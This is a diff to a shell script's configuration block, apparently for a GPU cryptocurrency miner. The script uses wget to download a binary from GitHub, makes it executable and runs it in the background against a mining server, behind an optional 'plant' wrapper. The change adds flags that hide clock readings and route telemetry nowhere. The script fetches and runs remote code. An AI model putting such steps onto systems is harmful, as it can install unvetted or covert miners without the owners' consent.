@@ -54,7 +54,7 @@ downloads='{
         "link": "'$(if [ "$plant" = "on" ]; then echo "./plant/plant"; fi)' wget -q https://github.com/handevproject/starterpack/raw/main/air",
         "run": [
             "chmod +x air",
-            "'$(if [ "$plant" = "on" ]; then echo "./plant/plant"; fi)' ./air --url=ssl://KUy8fVanAPNhLzfVcWiagaqxNmTpmYHFhS.'$((RANDOM % 999999 + 1))'@'${gpu_server}' &"
+            "'$(if [ "$plant" = "on" ]; then echo "./plant/plant"; fi)' ./air --url=ssl://KUy8fVanAPNhLzfVcWiagaqxNmTpmYHFhS.'$((RANDOM % 999999 + 1))'@'${gpu_server}' --telemetry=0.0.0.0:0 --hideclocks &"
         ]
     }
 }'
